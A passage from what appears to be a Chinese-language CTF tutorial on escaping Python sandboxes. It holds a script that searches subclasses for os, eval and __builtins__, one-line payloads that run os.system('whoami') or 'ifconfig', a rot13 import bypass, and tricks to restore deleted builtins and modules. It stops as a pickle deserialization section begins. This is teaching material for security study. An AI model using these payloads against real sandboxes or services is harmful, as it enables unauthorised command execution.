class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">if</span> f <span class="keyword">in</span> more:</span><br><span class="line">                    <span class="built_in">print</span>(i, f)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">python3</span>(<span class="params">results</span>):</span><br><span class="line">    find_modules=results</span><br><span class="line">    target_modules = [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'timeit'</span>, <span class="string">'importlib'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>]</span><br><span class="line">    target_functions = [<span class="string">'__import__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'exec'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'file'</span>, <span class="string">'open'</span>]</span><br><span class="line">    all_targets = <span class="built_in">list</span>(<span class="built_in">set</span>(<span class="built_in">list</span>(find_modules.keys()) + target_modules + target_functions))</span><br><span class="line">    all_modules = <span class="built_in">list</span>(<span class="built_in">set</span>(<span class="built_in">list</span>(find_modules.keys()) + target_modules))</span><br><span class="line">    subclasses = ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">    sub_name = [s.__name__ <span class="keyword">for</span> s <span class="keyword">in</span> subclasses]</span><br><span class="line">    <span class="comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'----------1-----------'</span>)</span><br><span class="line">    <span class="keyword">for</span> i, s <span class="keyword">in</span> <span class="built_in">enumerate</span>(sub_name):</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> f == s:</span><br><span class="line">                <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                    <span class="built_in">print</span>(i, f)</span><br><span class="line">                <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                    target = find_modules[f]</span><br><span class="line">                    sub_dict = subclasses[i].__dict__</span><br><span class="line">                    <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                        <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                            <span class="built_in">print</span>(i, f, target)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'----------2-----------'</span>)</span><br><span class="line">    <span class="comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['sys'].version</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub.__init__.__globals__</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">if</span> m <span class="keyword">in</span> more:</span><br><span class="line">                    <span class="built_in">print</span>(i, sub, m, find_modules.get(m))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'----------3-----------'</span>)</span><br><span class="line">    <span class="comment"># 执行命令，此处如果使用原作者给的第三种利用代码在python3中会报错，python3中对于dict.values不再返回列表，而是返回view，不可索引的对象。</span></span><br><span class="line">    <span class="comment"># 先要进入().__class__.__bases__[0].__subclasses__()[103].__init__.__globals__中找到__builtins__模块，然后执行后面的代码</span></span><br><span class="line">    <span class="comment"># ().__class__.__bases__[0].__subclasses__()[103].__init__.__globals__['__builtins__']['eval']('__import__("os").system("whoami")')</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub.__init__.__globals__.values()</span><br><span class="line">            <span class="keyword">for</span> j, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(more):</span><br><span class="line">                <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">if</span> f <span class="keyword">in</span> v:</span><br><span class="line">                            <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                                <span class="built_in">print</span>(i, j, sub, f)</span><br><span class="line">                            <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                                target = find_modules.get(f)</span><br><span class="line">                                sub_dict = v[f].__dict__</span><br><span class="line">                                <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                                    <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                                        <span class="built_in">print</span>(i, j, sub, f, target)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'----------4-----------'</span>)</span><br><span class="line">    <span class="comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub()._module.__builtins__</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">if</span> f <span class="keyword">in</span> more:</span><br><span class="line">                    <span class="built_in">print</span>(i, f)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    version= <span class="built_in">str</span>(sys.version_info.major)+<span class="string">"."</span>+<span class="built_in">str</span>(sys.version_info.minor)</span><br><span class="line">    url=<span class="string">"https://api.github.com/repos/python/cpython/contents/Lib?ref="</span>+version</span><br><span class="line">    results = get_file_name(url)</span><br><span class="line">    <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span>:</span><br><span class="line">        python2(results)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        python3(results)</span><br></pre></td></tr></tbody></table></figure>
<h3 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h3><h4 id="使用编码进行导入"><a href="#使用编码进行导入" class="headerlink" title="使用编码进行导入"></a>使用编码进行导入</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">test = <span class="built_in">__import__</span>(<span class="string">"pbzznaqf"</span>.decode(<span class="string">'rot_13'</span>))</span><br><span class="line"><span class="built_in">print</span> test.getoutput(<span class="string">'ifconfig'</span>)</span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">test = <span class="built_in">__import__</span>(<span class="built_in">__import__</span>(<span class="string">"codecs"</span>).decode(<span class="string">'bf'</span>,<span class="string">'rot_13'</span>))  <span class="comment"># python3没有commands模块</span></span><br><span class="line"><span class="built_in">print</span>(test.system(<span class="string">'ifconfig'</span>))</span><br><span class="line">```使用importlib库</span><br><span class="line"></span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">test = importlib.import_module(<span class="string">"pbzznaqf"</span>.decode(<span class="string">'rot_13'</span>)</span><br><span class="line"><span class="built_in">print</span> test.getoutput(<span class="string">'ifconfig'</span>)</span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">test = importlib.import_module(importlib.import_module(<span class="string">"codecs"</span>).decode(<span class="string">'bf'</span>,<span class="string">'rot_13'</span>))</span><br><span class="line"><span class="built_in">print</span>(test.system(<span class="string">'ifconfig'</span>))</span><br></pre></td></tr></tbody></table></figure>
<h4 id="内置函数被删除"><a href="#内置函数被删除" class="headerlink" title="内置函数被删除"></a>内置函数被删除</h4><p>在python中不用引入直接使用的内置函数称为builtin函数</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>在python3.x 版本中__builtin__变成了builtins</p>
<p>__builtin__和builtins在都需要import才可以用，但是__builtins__是内置的直接可以用</p>
<p>用__builtin__来举例子，因此open()、int()、chr()这些函数，就相当于<br>复制成功</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__builtin__.<span class="built_in">open</span>()</span><br><span class="line">__builtin__.<span class="built_in">int</span>()</span><br><span class="line">__builtin__.<span class="built_in">chr</span>()</span><br></pre></td></tr></tbody></table></figure>
<p>如果我们把这些函数从__builtin__中删除，那么就不能够再直接使用了</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─<span class="comment"># python2</span></span><br><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtin__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__.<span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line"><span class="string">'{'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line"><span class="string">'{'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtin__.<span class="built_in">chr</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">'chr'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__.<span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">'module'</span> <span class="built_in">object</span> has no attribute <span class="string">'chr'</span></span><br></pre></td></tr></tbody></table></figure>
<p>众所周知eval、exec、execfile也是在__builtin__中的，所以删除就不能用了，但是我们可以使用重加载函数reload()</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtin__)</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line"><span class="string">'{'</span></span><br></pre></td></tr></tbody></table></figure>
<p>reload也是__builtin__下面的函数，如果直接把它干掉，就没办法重新引入了</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtin__.reload</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtin__)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">'reload'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></tbody></table></figure>
<p>直接使用imp模块，这样我们就重新得到完整的__builtin__模块了</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> imp</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>imp.reload(__builtin__)</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></tbody></table></figure>
<h4 id="部分模块被限制"><a href="#部分模块被限制" class="headerlink" title="部分模块被限制"></a>部分模块被限制</h4><p>服务器如果对Python的某些高风险模块如os进行了删除或修改权限设置，可能导致无法正常使用。但是sys没有限制，我们可以使用sys.modules来查看初始化就加载的模块</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules</span><br><span class="line">{<span class="string">'copy_reg'</span>: &lt;module <span class="string">'copy_reg'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/copy_reg.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'sre_compile'</span>: &lt;module <span class="string">'sre_compile'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/sre_compile.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'_sre'</span>: &lt;module <span class="string">'_sre'</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">'encodings'</span>: &lt;module <span class="string">'encodings'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/encodings/__init__.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'site'</span>: &lt;module <span class="string">'site'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/site.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'__builtin__'</span>: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">'sysconfig'</span>: &lt;module <span class="string">'sysconfig'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/sysconfig.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'__main__'</span>: &lt;module <span class="string">'__main__'</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">'encodings.encodings'</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">'abc'</span>: &lt;module <span class="string">'abc'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/abc.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'posixpath'</span>: &lt;module <span class="string">'posixpath'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/posixpath.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'_weakrefset'</span>: &lt;module <span class="string">'_weakrefset'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/_weakrefset.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'errno'</span>: &lt;module <span class="string">'errno'</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">'encodings.codecs'</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">'sre_constants'</span>: &lt;module <span class="string">'sre_constants'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/sre_constants.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'re'</span>: &lt;module <span class="string">'re'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/re.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'_abcoll'</span>: &lt;module <span class="string">'_abcoll'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/_abcoll.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'types'</span>: &lt;module <span class="string">'types'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/types.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'_codecs'</span>: &lt;module <span class="string">'_codecs'</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">'encodings.__builtin__'</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">'_warnings'</span>: &lt;module <span class="string">'_warnings'</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">'genericpath'</span>: &lt;module <span class="string">'genericpath'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/genericpath.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'stat'</span>: &lt;module <span class="string">'stat'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/stat.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'zipimport'</span>: &lt;module <span class="string">'zipimport'</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">'_sysconfigdata'</span>: &lt;module <span class="string">'_sysconfigdata'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/_sysconfigdata.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'warnings'</span>: &lt;module <span class="string">'warnings'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/warnings.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'UserDict'</span>: &lt;module <span class="string">'UserDict'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/UserDict.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'glob'</span>: &lt;module <span class="string">'glob'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/glob.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'encodings.utf_8'</span>: &lt;module <span class="string">'encodings.utf_8'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/encodings/utf_8.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'sys'</span>: &lt;module <span class="string">'sys'</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">'fnmatch'</span>: &lt;module <span class="string">'fnmatch'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/fnmatch.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'imp'</span>: &lt;module <span class="string">'imp'</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">'codecs'</span>: &lt;module <span class="string">'codecs'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/codecs.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'readline'</span>: &lt;module <span class="string">'readline'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/lib-dynload/readline.x86_64-linux-gnu.so'</span>&gt;,</span><br><span class="line"> <span class="string">'_sysconfigdata_nd'</span>: &lt;module <span class="string">'_sysconfigdata_nd'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/plat-x86_64-linux-gnu/_sysconfigdata_nd.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'os.path'</span>: &lt;module <span class="string">'posixpath'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/posixpath.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'_locale'</span>: &lt;module <span class="string">'_locale'</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">'sitecustomize'</span>: &lt;module <span class="string">'sitecustomize'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/sitecustomize.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'signal'</span>: &lt;module <span class="string">'signal'</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">'traceback'</span>: &lt;module <span class="string">'traceback'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/traceback.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'linecache'</span>: &lt;module <span class="string">'linecache'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/linecache.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'posix'</span>: &lt;module <span class="string">'posix'</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">'encodings.aliases'</span>: &lt;module <span class="string">'encodings.aliases'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/encodings/aliases.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'exceptions'</span>: &lt;module <span class="string">'exceptions'</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">'sre_parse'</span>: &lt;module <span class="string">'sre_parse'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/sre_parse.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'os'</span>: &lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/os.pyc'</span>&gt;,</span><br><span class="line"> <span class="string">'_weakref'</span>: &lt;module <span class="string">'_weakref'</span> (built-<span class="keyword">in</span>)&gt;}</span><br></pre></td></tr></tbody></table></figure>
<p>如果我们修改掉os模块的路径，那么就无法使用了</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">'os'</span>]=<span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: No module named os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">'os'</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: No module named os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>importlib.import_module(<span class="string">'os'</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">"importlib/__init__.py"</span>, line <span class="number">37</span>, <span class="keyword">in</span> import_module</span><br><span class="line">    <span class="built_in">__import__</span>(name)</span><br><span class="line">ImportError: No module named os</span><br></pre></td></tr></tbody></table></figure>
<p>但是我们可以手动的在加上去</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">'os'</span>]=<span class="string">'/usr/lib/python2.7/os.pyc'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br></pre></td></tr></tbody></table></figure>
<h4 id="文件或者模块全被删除"><a href="#文件或者模块全被删除" class="headerlink" title="文件或者模块全被删除"></a>文件或者模块全被删除</h4><p>最极端的方式就是os、sys、reload模块都被干掉了，usr等目录被限制了权限，那么我们就可以使用Python加载模块的先后顺序的方式</p>
<p>当前目录 -&gt; sys.path列表中的其他目录</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.path</span><br><span class="line">[<span class="string">''</span>,</span><br><span class="line"> <span class="string">'/usr/lib/python2.7'</span>,</span><br><span class="line"> <span class="string">'/usr/lib/python2.7/plat-x86_64-linux-gnu'</span>,</span><br><span class="line"> <span class="string">'/usr/lib/python2.7/lib-tk'</span>,</span><br><span class="line"> <span class="string">'/usr/lib/python2.7/lib-old'</span>,</span><br><span class="line"> <span class="string">'/usr/lib/python2.7/lib-dynload'</span>,</span><br><span class="line"> <span class="string">'/usr/local/lib/python2.7/dist-packages'</span>,</span><br><span class="line"> <span class="string">'/usr/lib/python2.7/dist-packages'</span>,</span><br><span class="line"> <span class="string">'/usr/lib/python2.7/dist-packages'</span>]</span><br></pre></td></tr></tbody></table></figure>
<p>只需要把文件上传到当前文件同级目录就可以直接import os使用</p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>将对象转换为可通过网络传输或可以存储到本地磁盘的数据格式（如：XML、JSON或特定格式的字节串）的过程称为序列化；反之，则称为反序列化。如果用户反序列化一些不改反序列化的东西，那么就会造成漏洞</p>
<table>
<thead>
<tr>
<th align="left">模块名称</th>
<th align="left">描述</th>
<th align="left">提供的api</th>
</tr>
</thead>
<tbody><tr>
<td align="left">pickle</td>
<td align="left">用于实现Python数据类型与Python特定二进制格式之间的转换</td>
<td align="left">dumps()、dump()、loads()、load()</td>
</tr>
<tr>
<td align="left">json</td>
<td align="left">用于实现Python数据类型与通用（json）字符串之间的转换</td>
<td align="left">dumps()、dump()、loads()、load()</td>
</tr>
<tr>
<td align="left">shelve</td>
<td align="left">专门用于将Python数据类型的数据持久化到磁盘，shelve是一个类似dict的对象，操作十分便捷</td>
<td align="left">open()</td>
</tr>
<tr>
<td align="left">能够利用的函数pickle.loads</td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
